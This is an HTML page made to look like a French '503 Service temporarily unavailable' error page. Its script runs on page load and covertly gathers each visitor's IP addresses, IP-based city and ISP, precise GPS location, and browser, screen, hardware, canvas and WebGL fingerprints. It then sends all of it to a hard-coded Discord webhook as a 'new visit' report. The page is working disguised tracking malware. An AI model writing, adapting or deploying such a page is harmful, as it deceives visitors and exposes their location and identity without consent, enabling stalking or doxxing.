<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Erreur 503 - Service indisponible</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0a0a0a;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    h1 { color: #ff4444; font-size: 6rem; margin: 0; }
    h2 { color: #ff9800; margin: 10px 0 30px; }
    .code { font-family: monospace; font-size: 1.4rem; color: #ff6b6b; }
    button {
      background: #ff4444;
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 1.2rem;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 30px;
    }
    button:hover { background: #d32f2f; }
    footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
  </style>
</head>
<body>
  <h1>503</h1>
  <h2>Service temporairement indisponible</h2>
  <p class="code">Le serveur rencontre un problème technique.<br>Nos équipes interviennent. Réessayez dans quelques instants.</p>

  <button onclick="location.reload()">Réessayer</button>

  <footer>ID transaction : ERR-<span id="txid"></span> • Ref: <span id="ref"></span></footer>

  <script>
    document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
    document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();

    let infos = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      referrer: document.referrer || 'direct',
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages || [],
      platform: navigator.platform,
      vendor: navigator.vendor,
      screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
      availScreen: `${screen.availWidth}×${screen.availHeight}`,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation ? screen.orientation.type : null,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
      deviceMemory: navigator.deviceMemory || 'inconnu',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      online: navigator.onLine
    };

    if (navigator.connection) {
      infos.connection = {
        type: navigator.connection.effectiveType || navigator.connection.type,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      };
    }

    // Récupération IP (IPv4 prioritaire + IPv6)
    async function getIPs() {
      const urls = [
        'https://ipv4.icanhazip.com',
        'https://api.ipify.org',
        'https://checkip.amazonaws.com',
        'https://ifconfig.me/ip',
        'https://api.myip.com',
        'https://api64.ipify.org' // IPv6 fallback
      ];

      for (const url of urls) {
        try {
          const res = await fetch(url);
          if (res.ok) {
            const text = (await res.text()).trim();
            if (text.includes('.')) infos.ipv4 = text;
            if (text.includes(':')) infos.ipv6 = text;
            if (infos.ipv4) break;
          }
        } catch {}
      }

      if (!infos.ipv4) infos.ipv4 = "IPv4 non détectée";
      if (!infos.ipv6) infos.ipv6 = "IPv6 non détectée";
    }

    // Géoloc + ISP + ville
    async function getGeo() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        infos.city = d.city;
        infos.region = d.region;
        infos.country = d.country_name;
        infos.latitude = d.latitude;
        infos.longitude = d.longitude;
        infos.isp = d.org || d.asn;
      } catch {}
    }

    // Empreintes
    function fingerprints() {
      try {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText("test", 2,15);
        infos.canvas = c.toDataURL();
      } catch {}

      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (gl) {
          const di = gl.getExtension('WEBGL_debug_renderer_info');
          infos.webgl = {
            vendor: di ? gl.getParameter(di.UNMASKED_VENDOR_WEBGL) : null,
            renderer: di ? gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : null
          };
        }
      } catch {}
    }

    // Envoi Discord
    async function sendDiscord() {
      await getIPs();
      await getGeo();
      fingerprints();

      const embed = {
        embeds: [{
          title: "Nouvelle visite",
          color: 0xff0000,
          fields: [
            { name: "IPv4", value: infos.ipv4, inline: true },
            { name: "IPv6", value: infos.ipv6, inline: true },
            { name: "Ville / Région / Pays", value: `${infos.city || "?"} - ${infos.region || "?"} (${infos.country || "?"})`, inline: true },
            { name: "GPS", value: infos.latitude ? `${infos.latitude}, ${infos.longitude}` : "refusée", inline: true },
            { name: "FAI / ISP", value: infos.isp || "?", inline: true },
            { name: "User-Agent", value: "```" + infos.userAgent.substring(0, 300) + "```", inline: false },
            { name: "Écran", value: infos.screen, inline: true },
            { name: "Timezone", value: infos.timezone, inline: true },
            { name: "Connexion", value: infos.connection ? infos.connection.type : "?", inline: true },
            { name: "Hardware", value: `${infos.hardwareConcurrency} cœurs | ${infos.deviceMemory} Go`, inline: true },
            { name: "Canvas", value: infos.canvas ? "présent" : "absent", inline: true },
            { name: "WebGL", value: infos.webgl?.renderer || "?", inline: true }
          ],
          footer: { text: `ID: ${document.getElementById('txid').textContent} • ${new Date().toLocaleString('fr-FR')}` },
          timestamp: infos.timestamp
        }]
      };

      fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
      }).catch(() => {});
    }

    // Lancement
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          infos.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
          sendDiscord();
        },
        () => sendDiscord(),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      sendDiscord();
    }

    setTimeout(sendDiscord, 7000);
  </script>
</body>
</html>
